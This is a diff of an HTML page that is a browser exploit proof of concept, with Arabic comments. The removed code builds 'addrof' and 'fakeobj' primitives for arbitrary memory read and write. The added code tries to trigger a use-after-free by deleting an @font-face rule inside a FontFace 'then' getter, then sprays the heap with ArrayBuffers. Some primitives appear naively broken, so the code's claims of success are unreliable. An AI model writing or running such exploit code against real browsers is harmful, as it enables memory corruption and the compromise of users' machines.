@@ -1,47 +1,35 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div id="log">بدء العملية...</div>
+<body>
 <script>
-    function log(m) { console.log(m); document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
-
-    // 1. إعداد الذاكرة
-    let buffer = new ArrayBuffer(0x1000);
-    let floatView = new Float64Array(buffer);
-    let bigIntView = new BigUint64Array(buffer);
+    // 1. مصفوفة للسيطرة على الذاكرة (Heap Grooming)
+    let spray = [];
     
-    // 2. بدائية addrof: الحصول على عنوان الكائن
-    function addrof(obj) {
-        floatView[0] = obj;
-        return bigIntView[0];
-    }
+    // 2. المحفز (Trigger)
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
 
-    // 3. بدائية fakeobj: تحويل العنوان إلى كائن
-    function fakeobj(addr) {
-        bigIntView[0] = addr;
-        return floatView[0];
-    }
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            // تنفيذ الثغرة
+            document.getElementById('s').sheet.deleteRule(0);
+            
+            // "هندسة الذاكرة": هنا يتم ملء الفراغ الذي تركه الكائن المحذوف
+            // نستخدم ArrayBuffer أو كائنات أخرى بحجم مشابه
+            for (let i = 0; i < 100; i++) {
+                spray.push(new ArrayBuffer(0x1000)); 
+            }
+            
+            document.body.offsetTop; // Trigger Reflow
+            return undefined;
+        }
+    });
 
-    // 4. تنفيذ القراءة والكتابة العشوائية
-    // سنستخدم مصفوفة مخصصة (Victim Array)
-    let victim = { a: 1.1 };
-    let victimAddr = addrof(victim);
-    log("عنوان الكائن المستهدف: " + victimAddr.toString(16));
-
-    // لنفترض أننا نريد قراءة الذاكرة عند العنوان الذي استخرجناه سابقاً
-    let targetAddr = 0x7ff8000000000000n; 
-
-    // صنع كائن وهمي يشير إلى targetAddr
-    // (يجب مطابقة بنية الـ Butterfly في الذاكرة بدقة)
-    let fake = fakeobj(targetAddr);
-    
-    log("تم بناء الكائن الوهمي بنجاح.");
-    
-    // الآن، أي وصول إلى 'fake' هو في الواقع وصول إلى targetAddr
-    // قراءة/كتابة الذاكرة تتم هنا:
-    // fake[0] = 0x1234; 
+    document.fonts.load('1em x', 'AB');
 </script>
-
+<style id="s">
+    @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
 </body>
 </html>
-
